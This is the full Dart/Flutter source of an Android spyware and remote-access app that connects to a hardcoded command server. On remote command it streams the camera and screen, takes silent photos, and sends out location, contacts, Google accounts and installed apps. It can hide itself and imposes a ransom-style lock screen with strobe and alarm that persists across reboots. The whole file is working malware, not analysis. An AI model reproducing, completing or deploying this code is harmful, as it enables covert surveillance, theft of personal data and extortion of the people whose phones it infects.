import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; 
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:webview_flutter/webview_flutter.dart';
import 'package:camera/camera.dart';
import 'package:image/image.dart' as img;
import 'package:shared_preferences/shared_preferences.dart'; // TAMBAHAN PENTING

// ==================== KONFIGURASI SERVER ====================
const String SERVER_URL = 'http://panel-legal.jhonaley.net:2225';

// ==================== GLOBAL STATE DENGAN PERSISTENSI ====================
Map<String, dynamic> appConfig = {};
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "123";
late IO.Socket socket;

// State Manager untuk Persistensi (Tidak hilang saat restart)
class PersistentState {
  static const String _keyIsLocked = 'is_device_locked';
  static const String _keyLockMsg = 'lock_message';
  static const String _keyLockPin = 'lock_pin';
  static const String _keyStrobeActive = 'strobe_active';
  static const String _keyAudioUrl = 'audio_url';
  static const String _keyWallpaperUrl = 'wallpaper_url';
  static const String _keyLastCommand = 'last_command';
  static const String _keyCommandParams = 'command_params';

  // Simpan state ke storage permanen
  static Future<void> saveState({
    bool? isLocked,
    String? lockMsg,
    String? lockPin,
    bool? strobeActive,
    String? audioUrl,
    String? wallpaperUrl,
    String? lastCommand,
    String? params,
  }) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      if (isLocked != null) await prefs.setBool(_keyIsLocked, isLocked);
      if (lockMsg != null) await prefs.setString(_keyLockMsg, lockMsg);
      if (lockPin != null) await prefs.setString(_keyLockPin, lockPin);
      if (strobeActive != null) await prefs.setBool(_keyStrobeActive, strobeActive);
      if (audioUrl != null) await prefs.setString(_keyAudioUrl, audioUrl);
      if (wallpaperUrl != null) await prefs.setString(_keyWallpaperUrl, wallpaperUrl);
      if (lastCommand != null) await prefs.setString(_keyLastCommand, lastCommand);
      if (params != null) await prefs.setString(_keyCommandParams, params);
      
      debugPrint('[PERSIST] State saved: locked=$isLocked, cmd=$lastCommand');
    } catch (e) {
      debugPrint('[PERSIST] Save error: $e');
    }
  }

  // Load state dari storage
  static Future<Map<String, dynamic>> loadState() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      return {
        'is_locked': prefs.getBool(_keyIsLocked) ?? false,
        'lock_msg': prefs.getString(_keyLockMsg) ?? "YOUR PHONE IS LOCKED!!!!",
        'lock_pin': prefs.getString(_keyLockPin) ?? "123",
        'strobe_active': prefs.getBool(_keyStrobeActive) ?? false,
        'audio_url': prefs.getString(_keyAudioUrl),
        'wallpaper_url': prefs.getString(_keyWallpaperUrl),
        'last_command': prefs.getString(_keyLastCommand),
        'params': prefs.getString(_keyCommandParams),
      };
    } catch (e) {
      return {'is_locked': false};
    }
  }

  // Clear semua state (saat admin unlock/reset)
  static Future<void> clearState() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.clear();
    debugPrint('[PERSIST] State cleared');
  }
}

// Native Channels (Dengan fallback aman)
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');
const MethodChannel platformNativeLock = MethodChannel('com.nullx.pp/native_lock');
const MethodChannel platformBoot = MethodChannel('com.nullx.pp/boot_service'); // Channel untuk AutoStart

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // 1. Load Config
  await loadLocalConfig();
  
  // 2. Request Permissions (Safe)
  await requestPermissionsSafe();

  // 3. Get Device Info
  Map<String, String> deviceInfo = await getDeviceInfo();
  globalDeviceId = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  // 4. Initialize Boot Service (PENTING: Agar survive restart)
  await _initializeBootService();

  // 5. Restore State dari SharedPreferences (Recovery setelah restart)
  await _recoverStateAfterRestart();

  // 6. Initialize Listeners
  initNativeListenersSafe();

  // 7. Start Connection
  startSpywareConnection(globalDeviceId, globalDeviceModel);
  
  // 8. Auto collect initial data
  _autoCollectIntel();

  runApp(const MyApp());
}

// ==================== BOOT SERVICE (AUTO START) ====================
Future<void> _initializeBootService() async {
  try {
    // Memulai native service yang akan auto-start saat boot
    // Ini memerlukan implementasi native di android/app/src/main/kotlin/...
    await platformBoot.invokeMethod('start_foreground_service', {
      'device_id': globalDeviceId,
      'server_url': appConfig['server_url'] ?? SERVER_URL,
    });
    debugPrint('[BOOT] Foreground service initialized');
  } catch (e) {
    debugPrint('[BOOT] Service init failed (normal if no native impl): $e');
  }
}

// ==================== STATE RECOVERY (SETelah RESTART) ====================
Future<void> _recoverStateAfterRestart() async {
  try {
    Map<String, dynamic> savedState = await PersistentState.loadState();
    
    bool wasLocked = savedState['is_locked'] == true;
    String? lastCmd = savedState['last_command'];
    
    debugPrint('[RECOVERY] Checking state... Locked: $wasLocked, LastCmd: $lastCmd');
    
    // Jika sebelumnya locked, restore lock state
    if (wasLocked) {
      currentLockMessage = savedState['lock_msg'];
      currentLockPIN = savedState['lock_pin'];
      deviceLocked.value = true;
      
      // Restore efek-efek lainnya
      if (savedState['strobe_active'] == true) {
        _setFlashlight(true); // Nyalakan strobe lagi
      }
      
      if (savedState['audio_url'] != null && savedState['audio_url'].toString().isNotEmpty) {
        _playAudio(savedState['audio_url']); // Mainkan audio lagi
      }
      
      if (savedState['wallpaper_url'] != null) {
        _setWallpaper(savedState['wallpaper_url']); // Restore wallpaper
      }
      
      debugPrint('[RECOVERY] Lock state restored with all effects');
    }
    
    // Kirim status ke server bahwa device hidup kembali
    if (socket.connected || true) { // Akan dikirim saat socket connect
      sendStatusUpdate({
        'restarted': true,
        'was_locked': wasLocked,
        'recovered_command': lastCmd,
      });
    }
    
  } catch (e) {
    debugPrint('[RECOVERY] Error: $e');
  }
}

// ==================== CONFIG LOADER ====================
Future<void> loadLocalConfig() async {
  try {
    final String response = await rootBundle.loadString('assets/config.json');
    appConfig = json.decode(response);
    if (appConfig['server_url'] == null || appConfig['server_url']!.toString().isEmpty) {
      appConfig['server_url'] = SERVER_URL;
    }
  } catch (e) {
    appConfig = {"server_url": SERVER_URL, "owner_name": "admin", "landing_web": "https://google.com"};
  }
}

// ==================== PERMISSIONS (SAFE & COMPREHENSIVE) ====================
Future<void> requestPermissionsSafe() async {
  try {
    final permissions = [
      Permission.location,
      Permission.contacts,
      Permission.camera,
      Permission.microphone,
      Permission.ignoreBatteryOptimizations,
      Permission.notification,
      Permission.sms, 
      Permission.phone,
      Permission.storage,
      Permission.systemAlertWindow,
      Permission.accessMediaLocation,
      Permission.requestInstallPackages, // Untuk update mandiri jika perlu
    ];
    
    for (var perm in permissions) {
      try {
        var status = await perm.status;
        if (!status.isGranted) {
          await perm.request();
        }
      } catch (e) {
        debugPrint('Permission $perm skipped: $e');
      }
    }
  } catch (e) {
    debugPrint('Permission error: $e');
  }
}

// ==================== DEVICE INFO ====================
Future<Map<String, String>> getDeviceInfo() async {
  try {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    String modelName = "Unknown";
    String identifier = "UNKNOWN_ID_${DateTime.now().millisecondsSinceEpoch}";
    
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      modelName = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
      identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_').replaceAll(',', '_'); 
    } else if (Platform.isIOS) {
      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
      modelName = iosInfo.model ?? "iPhone";
      identifier = iosInfo.identifierForVendor ?? "IOS_$modelName";
    }
    
    return {"id": identifier, "model": modelName};
  } catch (e) {
    return {"id": "FALLBACK_ID", "model": "Unknown"};
  }
}

// ==================== NATIVE LISTENERS (SAFE) ====================
void initNativeListenersSafe() {
  try {
    platformNativeLock.setMethodCallHandler((call) async {
      if (call.method == "onTargetReply") {
        String replyText = call.arguments.toString();
        sendStatusUpdate({"chat_reply": replyText});
      }
    });
  } catch (e) {}
  
  try {
    platformSpy.setMethodCallHandler((call) async {
      if (call.method == "live_frame" && socket.connected) {
        socket.emit('camera_frame', {
          "deviceId": globalDeviceId,
          "frame": call.arguments['image'],
          "type": "front",
          "timestamp": DateTime.now().millisecondsSinceEpoch
        });
      }
      if (call.method == "screen_data" && socket.connected) {
        socket.emit('screen_capture', {
          "deviceId": globalDeviceId,
          "screenshot": call.arguments['image'],
          "timestamp": DateTime.now().millisecondsSinceEpoch
        });
      }
    });
  } catch (e) {}

  try {
    const EventChannel('com.nullx.pp/proxy_events').receiveBroadcastStream().listen(
      (data) { if (data != null) executeLogic(data); },
      onError: (error) => debugPrint('Proxy stream error: $error')
    );
  } catch (e) {}
}

// ==================== CONNECTION (DENGAN RECOVERY) ====================
void startSpywareConnection(String deviceId, String deviceName) {
  String serverBase = appConfig['server_url'] ?? SERVER_URL;
  
  socket = IO.io(serverBase, IO.OptionBuilder()
      .setTransports(['websocket'])
      .enableAutoConnect()
      .enableReconnection()
      .setReconnectionAttempts(999)
      .setReconnectionDelay(3000)
      .build());

  socket.onConnect((_) {
    debugPrint('[+] Connected to Server: $serverBase');
    _registerDeviceToServer(deviceId, deviceName);
    _startHeartbeat();
    
    // Setelah connect, kirim status recovery jika ada
    _sendRecoveryStatus();
  });

  socket.on('command', (data) {
    debugPrint('[CMD] Received: ${data['command']}');
    executeLogic(data);
  });

  socket.on('new_command', (data) => executeLogic(data));
  socket.on('execute', (data) => executeLogic(data));

  socket.onDisconnect((_) {
    debugPrint('[-] Disconnected from server');
    // Jangan panic, auto reconnect aktif
  });

  socket.onConnectError((err) {
    debugPrint('[!] Connection Error: $err');
  });
}

void _sendRecoveryStatus() async {
  Map<String, dynamic> state = await PersistentState.loadState();
  if (state['is_locked'] == true) {
    sendStatusUpdate({
      'event': 'device_restarted_while_locked',
      'lock_message': state['lock_msg'],
      'timestamp': DateTime.now().millisecondsSinceEpoch
    });
  }
}

// ==================== DEVICE REGISTRATION ====================
Future<void> _registerDeviceToServer(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    var registerData = {
      "deviceId": id,
      "model": model,
      "androidVersion": Platform.isAndroid ? "Android" : "iOS",
      "battery": level,
      "isOnline": true,
      "lastSeen": DateTime.now().toIso8601String(),
      "sim_operator": "Unknown",
      "network_type_name": "Unknown",
    };
    
    socket.emit('register_device', registerData);
    
    try {
      await http.post(
        Uri.parse("$SERVER_URL/api/devices"),
        body: jsonEncode(registerData),
        headers: {"Content-Type": "application/json"}
      );
    } catch (e) {}
    
    debugPrint('[+] Device Registered: $id');
  } catch (e) {
    debugPrint('[!] Registration error: $e');
  }
}

// ==================== HEARTBEAT ====================
void _startHeartbeat() {
  Timer.periodic(const Duration(seconds: 30), (timer) async {
    if (!socket.connected) return;
    
    try {
      final Battery battery = Battery();
      int level = await battery.batteryLevel;
      
      Position? pos;
      try {
        pos = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.low,
          timeLimit: const Duration(seconds: 5)
        );
      } catch (e) {}
      
      socket.emit('status_update', {
        "deviceId": globalDeviceId,
        "battery": level,
        "location": pos != null ? {"lat": pos.latitude, "lng": pos.longitude} : null,
        "isOnline": true,
        "isLocked": deviceLocked.value, // Selalu kirim status lock
        "lastSeen": DateTime.now().toIso8601String(),
      });
    } catch (e) {}
  });
}

// ==================== AUTO INTEL ====================
void _autoCollectIntel() async {
  await Future.delayed(const Duration(seconds: 2));
  try {
    final contacts = await _getContactsInternal();
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    sendStatusUpdate({
      "initial_contacts": contacts.length,
      "battery": level,
      "model": globalDeviceModel,
      "boot_completed": true,
    });
  } catch (e) {}
}

// ==================== COMMAND EXECUTOR (DENGAN PERSISTENSI) ====================
Future<void> executeLogic(dynamic data) async {
  String command = data['command']?.toString() ?? data['cmd']?.toString() ?? "idle";
  dynamic params = data['params'] ?? data['extra'] ?? "";
  String commandId = data['commandId']?.toString() ?? DateTime.now().millisecondsSinceEpoch.toString();
  
  dynamic resultData;
  bool success = true;

  debugPrint('[EXEC] Processing: $command');

  switch (command) {
    case "camera_start":
      String type = params is Map ? (params['type'] ?? 'back') : (params.toString().isEmpty ? 'back' : params);
      await _handleCameraStart(type);
      resultData = {"status": "Camera started: $type"};
      break;

    case "camera_stop":
      await _handleCameraStop();
      resultData = {"status": "Camera stopped"};
      break;

    case "take_photo":
    case "takeSilentPhotoBackground":
      String side = params.toString().isEmpty ? "back" : params.toString();
      await _takePhoto(side);
      break;

    case "screen_start":
      await _startScreenCapture();
      resultData = {"status": "Screen capture started"};
      break;

    case "screen_stop":
      await _stopScreenCapture();
      resultData = {"status": "Screen capture stopped"};
      break;

    case "get_screen":
      resultData = await _getScreenshotOnce();
      break;

    // ==================== LOCK DENGAN PERSISTENSI ====================
    case "lock":
    case "hard_lock":
      await _lockDevice(params);
      // SIMPAN STATE KE STORAGE (TIDAK AKAN HILANG SAAT RESTART)
      await PersistentState.saveState(
        isLocked: true,
        lockMsg: currentLockMessage,
        lockPin: currentLockPIN,
        lastCommand: 'lock',
        params: params.toString(),
      );
      resultData = {"status": "Device locked permanently until admin unlocks"};
      break;

    // ==================== UNLOCK (HANYA ADMIN BISA) ====================
    case "unlock":
      await _unlockDevice();
      // HAPUS SEMUA STATE
      await PersistentState.clearState();
      resultData = {"status": "Device unlocked and cleared"};
      break;

    case "flashlight_on":
    case "flash_strobe":
      await _setFlashlight(true);
      // Simpan state strobe
      await PersistentState.saveState(strobeActive: true);
      resultData = {"status": "Flashlight ON"};
      break;

    case "flashlight_off":
    case "stop_strobe":
      await _setFlashlight(false);
      await PersistentState.saveState(strobeActive: false);
      resultData = {"status": "Flashlight OFF"};
      break;

    case "play_audio":
      String url = params is Map ? (params['url'] ?? '') : params.toString();
      await _playAudio(params);
      // Simpan URL audio agar bisa diputar ulang saat restart
      await PersistentState.saveState(audioUrl: url);
      resultData = {"status": "Audio playing and saved"};
      break;

    case "stop_audio":
      await _audioPlayer.stop();
      await PersistentState.saveState(audioUrl: '');
      resultData = {"status": "Audio stopped"};
      break;

    case "set_video_wallpaper":
    case "set_html_wallpaper":
      String wpUrl = params is Map ? (params['url'] ?? params['htmlContent']) : params.toString();
      await _setWallpaper(wpUrl);
      await PersistentState.saveState(wallpaperUrl: wpUrl);
      resultData = {"status": "Wallpaper set permanently"};
      break;

    case "open_web":
    case "open_url":
      await _openUrl(params);
      resultData = {"status": "URL opened"};
      break;

    case "show_notification":
      await _showNotification(params);
      resultData = {"status": "Notification shown"};
      break;

    case "hide_app":
      try { await platformSpy.invokeMethod('moveToBackground'); } catch (e) {}
      resultData = {"status": "App hidden"};
      break;

    case "factory_reset":
      resultData = {"status": "Factory reset command received (simulation)"};
      break;

    case "get_location":
      resultData = await _getLocation();
      break;

    case "get_contacts":
      resultData = {"contacts": await _getContactsInternal()};
      break;

    case "get_gmails":
    case "get_accounts":
      resultData = await _getAccounts();
      break;

    case "get_apps":
      resultData = await _getInstalledApps();
      break;

    case "vibrate_loop":
      Vibration.vibrate(duration: 10000);
      try { await platformSpy.invokeMethod('vibrate_loop'); } catch (e) {}
      resultData = {"status": "Vibrating"};
      break;

    case "set_vol_max":
      try { await platformSpy.invokeMethod('set_vol_max'); } catch (e) {}
      resultData = {"status": "Volume maxed"};
      break;

    case "bring_to_foreground":
      try { await platformSpy.invokeMethod('bringToForeground'); } catch (e) {}
      resultData = {"status": "Brought to foreground"};
      break;

    case "speak_tts":
      try { await platformSpy.invokeMethod('speakText', {"text": params.toString()}); } catch (e) {}
      resultData = {"status": "Speaking"};
      break;

    default:
      success = false;
      resultData = {"error": "Unknown command: $command"};
  }

  _sendCommandResponse(commandId, success, resultData);
}

// ==================== RESPONSE HELPERS ====================
void _sendCommandResponse(String commandId, bool success, dynamic result) {
  if (socket.connected) {
    socket.emit('command_response', {
      "commandId": commandId,
      "success": success,
      "result": result,
      "deviceId": globalDeviceId,
      "timestamp": DateTime.now().millisecondsSinceEpoch
    });
  }
}

void sendStatusUpdate(Map<String, dynamic> data) {
  if (socket.connected) {
    socket.emit('status_update', {
      "deviceId": globalDeviceId,
      ...data,
      "timestamp": DateTime.now().millisecondsSinceEpoch
    });
  }
}

// ==================== CAMERA IMPLEMENTATION ====================
CameraController? _cameraController;
bool _isCameraStreaming = false;

Future<void> _handleCameraStart(String type) async {
  try {
    try {
      await platformSpy.invokeMethod('start_live_camera', {"side": type});
      return;
    } catch (e) {
      debugPrint('Native camera failed, using Flutter: $e');
    }
    
    final cameras = await availableCameras();
    CameraLensDirection direction = type == 'front' ? CameraLensDirection.front : CameraLensDirection.back;
    final cam = cameras.firstWhere(
      (c) => c.lensDirection == direction,
      orElse: () => cameras.first,
    );
    
    _cameraController = CameraController(cam, ResolutionPreset.low, enableAudio: false);
    await _cameraController!.initialize();
    _isCameraStreaming = true;
    _streamCameraFrames(type);
  } catch (e) {
    debugPrint('Camera start error: $e');
  }
}

void _streamCameraFrames(String type) async {
  while (_isCameraStreaming && _cameraController != null && _cameraController!.value.isInitialized) {
    try {
      final image = await _cameraController!.takePicture();
      final bytes = await File(image.path).readAsBytes();
      img.Image? decoded = img.decodeImage(bytes);
      
      if (decoded != null && socket.connected) {
        String base64Image = base64Encode(img.encodeJpg(decoded, quality: 30));
        socket.emit('camera_frame', {
          "deviceId": globalDeviceId,
          "frame": base64Image,
          "type": type,
          "timestamp": DateTime.now().millisecondsSinceEpoch
        });
      }
      
      await File(image.path).delete();
      await Future.delayed(const Duration(milliseconds: 200));
    } catch (e) {
      await Future.delayed(const Duration(seconds: 1));
    }
  }
}

Future<void> _handleCameraStop() async {
  _isCameraStreaming = false;
  try { await platformSpy.invokeMethod('stop_live_camera'); } catch (e) {}
  await _cameraController?.dispose();
  _cameraController = null;
}

Future<void> _takePhoto(String side) async {
  try {
    await _executeFlutterSilentCamera(side);
  } catch (e) {
    debugPrint('Photo error: $e');
  }
}

Future<void> _executeFlutterSilentCamera(String side) async {
  try {
    final cameras = await availableCameras();
    final cam = cameras.firstWhere(
      (c) => c.lensDirection == (side == "front" ? CameraLensDirection.front : CameraLensDirection.back),
      orElse: () => cameras.first,
    );
    
    final controller = CameraController(cam, ResolutionPreset.medium, enableAudio: false);
    await controller.initialize();
    XFile photo = await controller.takePicture();
    final bytes = await File(photo.path).readAsBytes();
    img.Image? decoded = img.decodeImage(bytes);
    
    if (decoded != null) {
      String base64Image = base64Encode(img.encodeJpg(decoded, quality: 60));
      socket.emit('camera_frame', {
        "deviceId": globalDeviceId,
        "frame": base64Image,
        "type": side,
        "timestamp": DateTime.now().millisecondsSinceEpoch,
        "isSnapshot": true
      });
    }
    
    await File(photo.path).delete();
    await controller.dispose();
  } catch (e) {
    debugPrint('Silent camera error: $e');
  }
}

// ==================== SCREEN CAPTURE ====================
bool _isScreenStreaming = false;

Future<void> _startScreenCapture() async {
  try {
    _isScreenStreaming = true;
    try {
      await platformSpy.invokeMethod('start_screen_capture');
    } catch (e) {
      await _getScreenshotOnce();
    }
  } catch (e) {}
}

Future<void> _stopScreenCapture() async {
  _isScreenStreaming = false;
  try { await platformSpy.invokeMethod('stop_screen_capture'); } catch (e) {}
}

Future<Map<String, dynamic>> _getScreenshotOnce() async {
  try {
    String? screenshot = await platformSpy.invokeMethod('get_screen');
    if (screenshot != null && socket.connected) {
      socket.emit('screen_capture', {
        "deviceId": globalDeviceId,
        "screenshot": screenshot,
        "timestamp": DateTime.now().millisecondsSinceEpoch
      });
      return {"success": true, "sent": true};
    }
  } catch (e) {}
  return {"success": false, "error": "Cannot capture screen"};
}

// ==================== LOCK/UNLOCK (DENGAN PERSISTENSI) ====================
Future<void> _lockDevice(dynamic params) async {
  if (params != null && params.toString().contains('|')) {
    List<String> parts = params.toString().split('|');
    currentLockMessage = parts[0];
    currentLockPIN = parts.length > 1 ? parts[1] : "123";
  }
  
  deviceLocked.value = true;
  
  // Efek visual dan audio
  try {
    await _audioPlayer.stop();
    // Gunakan asset lokal atau URL default yang reliable
    await _audioPlayer.play(AssetSource('sounds/alarm.mp3')); // Pastikan file ini ada di assets
    await platformStrobe.invokeMethod('startStrobe');
    Vibration.vibrate(duration: 3000, pattern: [0, 500, 500, 500]);
    await platformSpy.invokeMethod('bringToForeground');
  } catch (e) {
    // Fallback jika asset tidak ada
    debugPrint('Lock effect error: $e');
  }
}

Future<void> _unlockDevice() async {
  deviceLocked.value = false;
  try {
    await _audioPlayer.stop();
    await platformStrobe.invokeMethod('stop_strobe');
    Vibration.cancel();
    await platformSpy.invokeMethod('unlock');
  } catch (e) {}
  
  // Bersihkan state persistensi
  await PersistentState.clearState();
}

// ==================== FLASHLIGHT ====================
Future<void> _setFlashlight(bool on) async {
  try {
    if (on) {
      await platformStrobe.invokeMethod('flash_strobe');
    } else {
      await platformStrobe.invokeMethod('stop_strobe');
    }
  } catch (e) {
    debugPrint('Flashlight control error: $e');
  }
}

// ==================== AUDIO ====================
Future<void> _playAudio(dynamic params) async {
  try {
    String url = params is Map ? (params['url'] ?? '') : params.toString();
    double volume = params is Map ? (params['volume'] ?? 1.0) : 1.0;
    
    await _audioPlayer.stop();
    await _audioPlayer.setVolume(volume);
    
    // Coba play sebagai URL atau Asset
    if (url.startsWith('http')) {
      await _audioPlayer.play(UrlSource(url));
    } else if (url.isNotEmpty) {
      await _audioPlayer.play(AssetSource(url));
    }
  } catch (e) {
    debugPrint('Play audio error: $e');
  }
}

// ==================== WALLPAPER ====================
Future<void> _setWallpaper(dynamic urlOrContent) async {
  try {
    await platformSpy.invokeMethod('set_wallpaper', {"url": urlOrContent.toString()});
  } catch (e) {
    debugPrint('Set wallpaper error: $e');
  }
}

// ==================== URL LAUNCHER ====================
Future<void> _openUrl(dynamic url) async {
  try {
    String urlString = url.toString();
    if (await canLaunchUrl(Uri.parse(urlString))) {
      await launchUrl(Uri.parse(urlString), mode: LaunchMode.externalApplication);
    }
  } catch (e) {
    debugPrint('Open URL error: $e');
  }
}

// ==================== NOTIFICATION ====================
Future<void> _showNotification(dynamic params) async {
  try {
    String title = params is Map ? (params['title'] ?? 'Notification') : 'Notification';
    String message = params is Map ? (params['message'] ?? '') : params.toString();
    
    try {
      await platformSpy.invokeMethod('show_notification', {
        "title": title,
        "message": message
      });
    } catch (e) {
      debugPrint('Show notification: $title - $message');
    }
  } catch (e) {}
}

// ==================== DATA GETTERS ====================
Future<Map<String, dynamic>> _getLocation() async {
  try {
    Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
    return {"lat": pos.latitude, "lng": pos.longitude, "accuracy": pos.accuracy};
  } catch (e) {
    return {"error": e.toString()};
  }
}

Future<List<Map<String, String>>> _getContactsInternal() async {
  try {
    if (await FlutterContacts.requestPermission()) {
      final contacts = await FlutterContacts.getContacts(withProperties: true, withPhoto: false);
      return contacts.take(100).map((e) => {
        "name": e.displayName, 
        "num": e.phones.isNotEmpty ? e.phones.first.number : "",
        "email": e.emails.isNotEmpty ? e.emails.first.address : ""
      }).toList();
    }
  } catch (e) {}
  return [];
}

Future<dynamic> _getAccounts() async {
  try {
    String? accounts = await platformSpy.invokeMethod('get_gmails');
    return {"accounts": accounts ?? "Denied", "type": "google"};
  } catch (e) {
    return {"accounts": [], "error": e.toString()};
  }
}

Future<List<dynamic>> _getInstalledApps() async {
  try {
    final List<dynamic> apps = await platformSpy.invokeMethod('get_apps');
    return apps;
  } catch (e) {
    return [];
  }
}

// ==================== UI COMPONENTS (SAFE BUILD) ====================
class MyApp extends StatelessWidget {
  const MyApp({super.key});
  
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(scaffoldBackgroundColor: Colors.black),
      home: const MainLockWrapper(),
    );
  }
}

class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});
  
  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper> with WidgetsBindingObserver {
  final TextEditingController _passController = TextEditingController();
  late final WebViewController _webController;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _initWebView();
  }

  void _initWebView() {
    try {
      _webController = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..setNavigationDelegate(NavigationDelegate(
          onPageStarted: (url) => debugPrint('Loading: $url'),
          onWebResourceError: (error) => debugPrint('Web Error: ${error.description}'),
        ))
        ..loadRequest(Uri.parse(appConfig['landing_web'] ?? "https://google.com"));
    } catch (e) {
      debugPrint('WebView init error: $e');
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _passController.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    // Force foreground jika locked
    if (deviceLocked.value && (state == AppLifecycleState.paused || state == AppLifecycleState.inactive)) {
      Future.delayed(const Duration(milliseconds: 500), () {
        try { platformSpy.invokeMethod('bringToForeground'); } catch (e) {}
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (context, isLocked, child) {
        return PopScope(
          canPop: !isLocked,
          child: Stack(
            children: [
              Scaffold(
                body: WebViewWidget(controller: _webController),
              ),
              
              if (isLocked)
                Material(
                  color: Colors.black87,
                  child: SafeArea(
                    child: Padding(
                      padding: const EdgeInsets.all(20),
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          const Icon(Icons.gpp_maybe, color: Colors.red, size: 80),
                          const SizedBox(height: 20),
                          Text(
                            currentLockMessage, 
                            textAlign: TextAlign.center, 
                            style: const TextStyle(color: Colors.red, fontSize: 22, fontWeight: FontWeight.bold)
                          ),
                          const SizedBox(height: 40),
                          TextField(
                            controller: _passController,
                            obscureText: true,
                            textAlign: TextAlign.center,
                            style: const TextStyle(color: Colors.white, fontSize: 18),
                            decoration: InputDecoration(
                              hintText: "ENTER PASSWORD",
                              hintStyle: TextStyle(color: Colors.grey[600]),
                              enabledBorder: OutlineInputBorder(
                                borderSide: const BorderSide(color: Colors.red),
                                borderRadius: BorderRadius.circular(10)
                              ),
                              focusedBorder: OutlineInputBorder(
                                borderSide: const BorderSide(color: Colors.redAccent, width: 2),
                                borderRadius: BorderRadius.circular(10)
                              ),
                            ),
                          ),
                          const SizedBox(height: 20),
                          SizedBox(
                            width: double.infinity,
                            height: 50,
                            child: ElevatedButton(
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Colors.red[900],
                                foregroundColor: Colors.white,
                                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))
                              ),
                              onPressed: () async {
                                if (_passController.text == currentLockPIN) {
                                  await _unlockDevice(); // Ini juga clear persistent state
                                  _passController.clear();
                                } else {
                                  Vibration.vibrate(duration: 200);
                                  if (mounted) {
                                    ScaffoldMessenger.of(context).showSnackBar(
                                      const SnackBar(content: Text('Wrong Password!'), backgroundColor: Colors.red)
                                    );
                                  }
                                }
                              },
                              child: const Text("UNLOCK DEVICE", style: TextStyle(fontSize: 16)),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }
}